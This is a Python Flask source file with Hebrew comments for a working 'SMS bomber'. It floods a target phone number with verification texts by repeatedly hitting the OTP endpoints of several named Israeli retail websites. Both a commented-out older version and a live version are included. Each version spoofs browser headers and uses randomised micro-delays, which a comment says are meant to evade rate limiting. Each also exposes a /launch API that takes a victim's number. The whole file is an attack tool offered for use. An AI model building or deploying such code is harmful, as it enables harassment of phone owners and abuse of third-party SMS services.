

# import concurrent.futures
# import requests
# import random
# import time
# import os
# from flask import Flask, jsonify, request
# from flask_cors import CORS

# app = Flask(__name__)
# # מאפשר לאפליקציית ה-Lovable שלך לגשת ל-API ללא חסימות אבטחה
# CORS(app)

# # רשימת ה-8 המנצחים שאישרת שעובדים ב-100%
# SITES = [
#     {"name": "Femina", "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "type": "json", "body": {"phone": "{phone}"}},
#     {"name": "Housemen", "url": "https://housemen.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=simply-check-member-cellphone&cellphone={phone}"},
#     {"name": "Spices", "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=validate_user_by_sms&phone={phone}"},
#     {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "type": "json", "body": {"value": "{phone}", "type": "phone", "projectId": "1"}},
#     {"name": "Naot", "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json", "body": {"phoneNumber": "{phone}"}},
#     {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
#     {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
#     {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "type": "json", "body": {"phoneNumber": "{phone}", "sourceFrom": "desktopHomePage"}}
# ]

# def send_burst(node, phone, repeats=7):
#     """מבצע שליחה חוזרת מאותו אתר עם השהיה למניעת חסימה"""
#     session = requests.Session()
#     headers = {
#         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
#         "Accept": "*/*",
#         "X-Requested-With": "XMLHttpRequest"
#     }

#     for i in range(repeats):
#         try:
#             if node["type"] == "json":
#                 headers["Content-Type"] = "application/json"
#                 payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v for k, v in node["body"].items()}
#                 res = session.post(node["url"], json=payload, headers=headers, timeout=10)
#             else:
#                 headers["Content-Type"] = "application/x-www-form-urlencoded"
#                 payload = node["body"].replace("{phone}", phone)
#                 res = session.post(node["url"], data=payload, headers=headers, timeout=10)
            
#             print(f"[*] {node['name']} ({i+1}/7): {res.status_code}")
#             time.sleep(random.uniform(5, 8)) 
            
#         except Exception as e:
#             print(f"[!] Error in {node['name']}: {e}")
#             break

# @app.route('/', methods=['GET', 'HEAD'])
# def health_check():
#     """נתיב שמוודא שהשרת חי (מונע שגיאות 404 ב-Render)"""
#     return jsonify({"status": "online", "message": "SMS Titan is running"}), 200

# @app.route('/launch', methods=['POST'])
# def launch():
#     """הנתיב המרכזי שמקבל את מספר הטלפון ומפעיל את המערכת"""
#     data = request.get_json()
#     target = data.get('phone') if data else None
    
#     if not target:
#         return jsonify({"status": "error", "message": "No phone number provided"}), 400

#     print(f"\n--- INITIATING 56-SMS ATTACK ON {target} ---\n")
    
#     # הפעלה מקבילית של ה-Threads
#     with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
#         for node in SITES:
#             executor.submit(send_burst, node, target)
            
#     return jsonify({"status": "success", "target": target})

# if __name__ == '__main__':
#     # הגדרות חובה עבור Render
#     port = int(os.environ.get("PORT", 5000))
#     app.run(host='0.0.0.0', port=port)

import concurrent.futures
import requests
import random
import time
import os
from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# הגדרות מטח
BURST_PER_SITE = 10

SITES = [
    {"name": "Naot",       "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json", "body": {"phoneNumber": "{phone}"}},
    {"name": "CrazyLine",  "url": "https://www.crazyline.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
    {"name": "Housemen",   "url": "https://housemen.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=simply-check-member-cellphone&cellphone={phone}"},
    {"name": "Spices",     "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=validate_user_by_sms&phone={phone}"},
    {"name": "Urbanica",   "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
    {"name": "Femina",     "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "type": "json", "body": {"phone": "{phone}"}},
]

def get_headers(site_url):
    return {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": site_url.rsplit('/', 1)[0],
        "Origin": site_url.rsplit('/', 3)[0]
    }

def execute_smart_burst(site, phone):
    """שולח 10 סמסים בצורה חכמה: שימוש ב-Session והשהיות מיקרו"""
    success_count = 0
    # שימוש ב-Session שומר על חיבור פתוח (Keep-Alive) ועל קוקיז, מה שגורם לזה לעבוד טוב יותר
    session = requests.Session()
    headers = get_headers(site["url"])
    
    for i in range(BURST_PER_SITE):
        try:
            if site["type"] == "json":
                headers["Content-Type"] = "application/json"
                payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v for k, v in site["body"].items()}
                resp = session.post(site["url"], json=payload, headers=headers, timeout=5)
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                payload = site["body"].replace("{phone}", phone)
                resp = session.post(site["url"], data=payload, headers=headers, timeout=5)

            if resp.status_code in (200, 201, 202):
                success_count += 1
                print(f"[+] {site['name']} - SMS {i+1} Sent")
            else:
                print(f"[-] {site['name']} - Blocked at {i+1} (Status: {resp.status_code})")
                # אם האתר חסם אותנו (למשל 429), אין טעם להמשיך לאותו אתר
                if resp.status_code == 429: break 

            # השהיית מיקרו - זה הסוד. 0.4 עד 0.9 שניות. 
            # זה מהיר מאוד אבל עובר את רוב ההגנות הפשוטות.
            time.sleep(random.uniform(0.4, 0.9))

        except Exception as e:
            print(f"[!] {site['name']} Error: {e}")
            break
            
    return success_count

@app.route('/launch', methods=['POST'])
def launch():
    data = request.get_json() or {}
    phone = data.get('phone')

    if not phone:
        return jsonify({"error": "No phone"}), 400

    print(f"\n--- STARTING SMART BURST ON {phone} ---\n")

    total_sent = 0
    # מפעילים כל אתר ב-Thread נפרד. בתוך כל Thread יש לולאה של 10.
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(SITES)) as executor:
        results = list(executor.map(lambda s: execute_smart_burst(s, phone), SITES))
        total_sent = sum(results)

    print(f"\n--- COMPLETED: {total_sent} SMS SENT ---")
    return jsonify({"status": "success", "total_sent": total_sent})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)